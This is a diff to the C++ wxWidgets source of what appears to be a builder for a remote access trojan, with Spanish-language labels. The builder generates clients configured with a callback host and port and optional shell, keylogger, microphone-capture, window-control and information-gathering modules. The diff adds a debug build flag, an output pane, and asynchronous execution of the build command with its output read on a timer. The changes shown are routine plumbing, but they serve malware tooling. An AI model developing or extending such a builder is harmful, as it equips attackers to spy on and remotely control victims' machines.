@@ -3,6 +3,7 @@
 #include "frame_listener.hpp"
 #include "misc.hpp"
 #include <wx/utils.h> 
+#include <wx/stream.h>
 
 extern Servidor* p_Servidor;
 
@@ -22,6 +23,7 @@ FrameBuilder::FrameBuilder(wxWindow* pParent)
 	wxBoxSizer* boxHost = new wxBoxSizer(wxHORIZONTAL);
 	this->txtHost = new wxTextCtrl(pnl_Main, wxID_ANY, "127.0.0.1", wxDefaultPosition, wxDefaultSize);
 	this->txtPort = new wxTextCtrl(pnl_Main, wxID_ANY, "65500", wxDefaultPosition, wxDefaultSize);
+	this->txtOutput = new wxTextCtrl(pnl_Main, wxID_ANY, "...", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxTE_READONLY | wxHSCROLL);
 
 	boxHost->AddSpacer(10);
 	boxHost->Add(new wxStaticText(pnl_Main, wxID_ANY, "Host:"));	
@@ -47,12 +49,13 @@ FrameBuilder::FrameBuilder(wxWindow* pParent)
 	boxListener->Add(this->cmbListeners, 1, wxALL | wxEXPAND);
 	boxListener->Add(this->btnRefListeners, 0);
 	boxListener->AddSpacer(10);
-
+	
 	box_Server->AddSpacer(10);
 	box_Server->Add(boxHost);
 	box_Server->AddSpacer(10);
 	box_Server->Add(boxListener, 1, wxALL | wxEXPAND);
 	box_Server->AddSpacer(10);
+	box_Server->Add(this->txtOutput, 1, wxALL | wxEXPAND);
 
 	pnl_Main->SetSizer(box_Server);
 
@@ -74,8 +77,11 @@ FrameBuilder::FrameBuilder(wxWindow* pParent)
 	this->chkAdmVentanas =  new wxCheckBox(pnlMods, wxID_ANY, "Administrador de Ventanas", wxDefaultPosition, wxDefaultSize);
 	this->chkInformacion =  new wxCheckBox(pnlMods, wxID_ANY, "Recoleccion de informacion", wxDefaultPosition, wxDefaultSize);
 	this->chkBromas =       new wxCheckBox(pnlMods, wxID_ANY, "Bromas :v", wxDefaultPosition, wxDefaultSize);
+	this->chkDebug =        new wxCheckBox(pnlMods, wxID_ANY, "Debug", wxDefaultPosition, wxDefaultSize);
 
 	box_Mods->AddSpacer(10);
+	box_Mods->Add(this->chkDebug);
+	box_Mods->AddSpacer(20);
 	box_Mods->Add(this->chkShell);
 	box_Mods->Add(this->chkKeylogger);
 	box_Mods->Add(this->chkMic);
@@ -109,6 +115,9 @@ FrameBuilder::FrameBuilder(wxWindow* pParent)
 	this->SetSizeHints(this->GetSize(), this->GetSize());
 
 	this->RefrescarLista();
+
+	Bind(wxEVT_TIMER, &FrameBuilder::OnTimer, this);
+
 
 	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
 }
@@ -168,6 +177,9 @@ void FrameBuilder::OnGenerarCliente(wxCommandEvent& event) {
 	if (this->chkBromas->GetValue()) {
 		strCmd.append("-DUSE_FUN=ON ");
 	}
+	if (this->chkDebug->GetValue()) {
+		strCmd.append("-DUSE_DEBUG=ON ");
+	}
 
 	wxString strHost = this->txtHost->GetValue();
 	wxString strPort = this->txtPort->GetValue();
@@ -213,7 +225,20 @@ void FrameBuilder::OnGenerarCliente(wxCommandEvent& event) {
 	strCmd.append("del /S /Q " + strNewfolder + "\\* .* && ");
 	strCmd.append("rmdir /S /Q .\\" + strNewfolder + "\\.");
 
-	wxShell(strCmd);
+	//wxShell(strCmd);
+	//if (this->nProcess) { delete this->nProcess; this->nProcess = NULL; }
+	
+	//this->nProcess = new wxProcess(wxPROCESS_REDIRECT);
+	//wxProcess n;
+	this->nProcess = new MyProcess(this);
+	//this->nProcess = wxProcess::Open(strCmd, wxEXEC_ASYNC);
+
+	int iRet = wxExecute(strCmd, wxEXEC_ASYNC, this->nProcess);
+
+	if (iRet != -1) {
+		//Success lanzar thread para leer
+		this->m_timer.Start(5);
+	}
 
 	if (!::CreateDirectoryA(strNewfolder, NULL)) {
 		wxMessageBox("[2] No se pudo crear el directorio " + strNewfolder, "Builder", wxICON_ERROR);
@@ -222,7 +247,7 @@ void FrameBuilder::OnGenerarCliente(wxCommandEvent& event) {
 
 	strCmd = "xcopy .\\cliente.exe .\\" + strNewfolder + "\\ && del /Q /F .\\cliente.exe";
 
-	wxShell(strCmd);
+	//wxShell(strCmd);
 
 	wxMessageBox("Cliente listo en " + strNewfolder, "Builder");
 }
@@ -263,4 +288,19 @@ void FrameBuilder::RefrescarLista() {
 	this->cmbListeners->Clear();
 	this->cmbListeners->Append(listeners_opts);
 	this->cmbListeners->Refresh();
+}
+
+void FrameBuilder::OnTimer(wxTimerEvent& event) {
+	wxInputStream* in = this->nProcess->GetInputStream();
+	if (!in) { return; }
+	if (in->CanRead()) {
+		char nBuffer[255];
+		in->Read(&nBuffer, 254);
+		size_t read_bytes = in->LastRead();
+		if (read_bytes > 0) {
+			nBuffer[read_bytes] = '\0';
+			this->txtOutput->AppendText(wxString(nBuffer));
+		}
+	}
+	
 }
